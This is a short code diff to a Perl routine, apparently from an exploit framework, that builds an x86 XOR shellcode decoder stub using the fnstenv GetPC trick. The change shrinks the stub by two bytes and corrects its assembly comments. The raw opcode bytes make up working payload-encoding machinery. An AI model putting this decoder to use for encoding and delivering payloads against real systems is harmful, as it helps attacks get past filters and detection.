@@ -257,17 +257,16 @@ sub XorDecoderDwordFnstenv {
 # spoon's smaller variable-length encoder
         my $decoder;
         if($smallVersion) {
-            # 26 bytes
+            # 24 bytes
             $decoder =
                 "\xd9\xee".                   # fldz
                 "\xd9\x74\x24\xf4".           # fnstenv [esp - 12]
                 "\x5b".                       # pop ebx
-                "\x83\xc3\x1a".               # add ebx, BYTE 26
                 "\x31\xc9".                   # xor ecx,ecx
                 "\x83\xe9". $xorlen .         # sub ecx, BYTE -xorlen
-                "\x81\x33". $xorkey .         # xor_xor: xor DWORD [ebx],xorkey
-                "\x83\xeb\xfc".               # sub $esi,-4
-                "\xe2\xf5"                    # loop 0x8 (xor_xor)
+                "\x81\x73\x18". $xorkey .     # xor_xor: xor DWORD [ebx],xorkey
+                "\x83\xeb\xfc".               # sub ebx,-4
+                "\xe2\xf4"                    # loop xor_xor
         }
         else {
             # 29 bytes
@@ -279,8 +278,8 @@ sub XorDecoderDwordFnstenv {
                 "\x31\xc9".                   # xor ecx,ecx
                 "\x81\xe9". $xorlen .         # sub ecx, BYTE -xorlen
                 "\x81\x33". $xorkey .         # xor_xor: xor DWORD [ebx],xorkey
-                "\x83\xeb\xfc".               # sub $esi,-4
-                "\xe2\xf5"                    # loop 0x8 (xor_xor)
+                "\x83\xeb\xfc".               # sub ebx,-4
+                "\xe2\xf5"                    # loop xor_xor
         }
 
         return $decoder;
